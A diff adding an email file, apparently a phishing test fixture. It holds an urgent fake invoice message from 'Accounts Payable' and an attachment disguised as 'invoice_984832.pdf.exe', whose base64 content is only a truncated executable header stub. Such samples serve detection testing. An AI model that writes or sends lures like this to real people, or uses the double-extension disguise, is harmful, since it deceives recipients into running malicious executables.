@@ -1,0 +1,29 @@
+From: "Accounts Payable" <invoice@vendorservices.net>
+To: target-corp@example.com
+Subject: Invoice #984832 Outstanding Payment Due
+Date: Fri, 17 Jul 2026 12:15:00 -0400
+Return-Path: <invoice@vendorservices.net>
+Message-ID: <msg-44444@vendorservices.net>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="boundary-malicious"
+
+--boundary-malicious
+Content-Type: text/plain; charset="utf-8"
+
+Please find attached invoice #984832 for your outstanding payment.
+Ensure this is processed immediately.
+
+Sincerely,
+Accounts Department
+
+--boundary-malicious
+Content-Type: application/octet-stream; name="invoice_984832.pdf.exe"
+Content-Disposition: attachment; filename="invoice_984832.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQokAAAAAAAAAFBFAABMAQMAAAAAAAAAAAAAAAAAAJAAAhELAQAAAAAAAAAAAAAAAADwAAAA
+AAAAAAA=
+
+--boundary-malicious--
